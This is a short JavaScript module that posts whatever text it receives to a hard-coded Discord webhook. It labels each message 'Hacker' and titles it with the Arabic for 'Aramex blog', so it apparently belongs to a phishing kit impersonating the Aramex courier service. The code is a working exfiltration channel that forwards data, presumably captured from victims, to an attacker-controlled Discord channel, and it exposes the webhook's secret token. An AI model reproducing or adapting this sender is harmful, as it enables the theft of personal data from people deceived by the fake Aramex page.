import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1313533643985125486/AfAjjIKINedDPV5cX5fQUmBF501BMaXDDsf8bOSHXopg2TlaYCl6w321OmBESRdTOiN3",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
